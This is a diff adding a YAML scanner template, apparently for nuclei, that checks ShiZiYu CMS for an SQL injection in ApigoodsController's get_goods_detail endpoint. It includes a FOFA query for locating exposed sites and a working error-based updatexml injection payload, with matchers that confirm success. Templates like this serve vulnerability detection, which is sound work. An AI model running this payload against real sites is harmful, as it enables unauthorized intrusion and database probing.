@@ -1,0 +1,33 @@
+id: shiziyu-ApigoodsController-sqlinjection
+info:
+  name: 狮子鱼CMS ApigoodsController.class.php SQL注入漏洞
+  author:
+  - zxcv
+  tags:
+  - sqlinjection
+  - shiziyu
+  description: |-
+    狮子鱼CMS ApigoodsController.class.php SQL注入漏洞
+    狮子鱼CMS ApigoodsController.class.php 参数过滤存在不严谨，导致SQL注入漏洞
+  severity: high
+  metadata:
+    fofa-query: /seller.php?s=/Public/login
+    verified: true
+  remediation: 升级至最新版本
+requests:
+- matchers:
+  - type: word
+    part: body
+    words:
+    - 'XPATH syntax error: ''~'
+    - '{{verify}}'
+  - type: status
+    status:
+    - 404
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,md5({{number}}),0x7e),1)'
+  method: GET
+variables:
+  number: '{{rand_int(1, 100)}}'
+  verify: '{{md5({{number}})}}'
